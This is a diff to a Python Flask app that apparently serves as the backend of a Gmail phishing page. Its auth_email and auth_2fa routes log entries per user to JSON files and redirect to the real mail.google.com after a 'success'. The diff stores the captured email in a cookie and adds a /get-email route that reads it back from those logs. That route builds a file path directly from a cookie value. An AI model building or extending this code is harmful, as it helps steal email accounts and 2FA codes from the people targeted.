@@ -81,7 +81,15 @@ def auth_email():
             'user_id', 
             user_id,
             httponly=True,
-            samesite='Lax'
+            samesite='Lax',
+            max_age=60*60*24  # 1 jour
+        )
+        
+        # Stocker l'email dans un cookie temporaire
+        response.set_cookie(
+            'temp_email',
+            email,
+            max_age=60*5  # 5 minutes
         )
         
         return response, 200
@@ -133,6 +141,37 @@ def auth_2fa():
             "status": "success",
             "redirect": "https://mail.google.com"
         }), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/get-email", methods=["GET"])
+def get_email():
+    """Récupérer l'email pour l'affichage"""
+    try:
+        user_id = request.cookies.get('user_id')
+        if not user_id:
+            return jsonify({"error": "Session invalide"}), 400
+        
+        # Lire le fichier de log
+        filename = f"{LOG_DIR}/{user_id}.json"
+        if not os.path.exists(filename):
+            return jsonify({"error": "Données non trouvées"}), 404
+        
+        with open(filename, "r") as f:
+            data = json.load(f)
+        
+        # Trouver l'email dans les logs
+        email = None
+        for entry in data["logs"]:
+            if entry["type"] == "EMAIL":
+                email = entry["data"]
+                break
+        
+        if email:
+            return jsonify({"email": email}), 200
+        else:
+            return jsonify({"error": "Email non trouvé"}), 404
+            
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
